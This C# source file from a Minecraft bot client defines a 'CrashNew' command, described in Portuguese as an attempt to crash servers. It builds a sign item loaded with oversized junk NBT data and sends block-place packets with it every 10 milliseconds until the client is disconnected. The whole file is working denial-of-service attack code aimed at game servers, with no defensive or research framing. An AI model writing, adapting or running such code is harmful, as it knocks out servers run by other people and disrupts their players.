using AdvancedBot.client.Map;
using AdvancedBot.client.NBT;
using AdvancedBot.client.Packets;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AdvancedBot.client.Commands
{
    public class CommandCrashNew : CommandBase
    {
        private static ItemStack sign = new ItemStack(Items.sign);
        public CommandCrashNew(MinecraftClient cli)
            : base(cli, "CrashNew", "Tenta crashar um servidor em massa", "ncrash")
        {
        }
        public override CommandResult Run(string alias, string[] args)
        {
            sign = new ItemStack(Items.sign);
            Client.PrintToChat("§eCrashando servidor...");
            var task = Task.Run(async () => {
                try
                {
                    ListTag<StringTag> list = new ListTag<StringTag>();
                    CompoundTag tag = new CompoundTag();
                    String author = Client.Username;
                    String title = "Play with me.";
                    String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    for (int i = 0; i < 50; ++i)
                    {
                        String siteContent = size;
                        StringTag tString = new StringTag("", siteContent);
                        list.AddTag(tString);
                    }
                    tag.AddString("name", title);
                    tag.AddString("text1", "OEWFOWEFJIEW FIWEJ FIEWJF IOEWJF 92930 3290F U2390FU 23980FU 2390FU 2398F0U23 8FU 238FU 238FU2389FU2389F2389");
                    tag.AddString("text2", "OFJEWFWEIOFJWE FHEWUIF HWEUF H9FU9032U F28930U F823UF 2389FU 2389FUY 2389F 2U3890FU23980F U832UF 8U8U'");
                    tag.AddString("text3", " EWOFI '=-9 F'=-09 0'380-3' 9F80-'93 F0='39 F0'39F=-'390F-'39 F0-'3I9 F-0'3I9F0-93'IF0-'I3F-0I3'F9U");
                    tag.AddString("text4", " 0129 I-0R930R 32O0R-23 R-=2 30R-=230 R=-23R-= 2 3=RP2O3-=RO =23RO2-3=RO 23-=RO23-=RIO23 0R-I23R");
                    sign.NBTData = tag;
                    
                    while (Client.IsBeingTicked())
                    {
                        Debug.WriteLine("placing");
                        Client.SendPacket(new PacketBlockPlace(new HitResult(
                            (int)Client.Player.PosX, 
                            (int)Client.Player.PosY - 2, 
                            (int)Client.Player.PosZ, 0)
                            , sign));
                        Thread.Sleep(10);
                    }
                    Client.PrintToChat("§eParando o envio de packets, o cliente foi desconectado");
                }
                catch (Exception e){ Debug.WriteLine(e.ToString()); }
            });
            return CommandResult.Success;
        }
    }
}
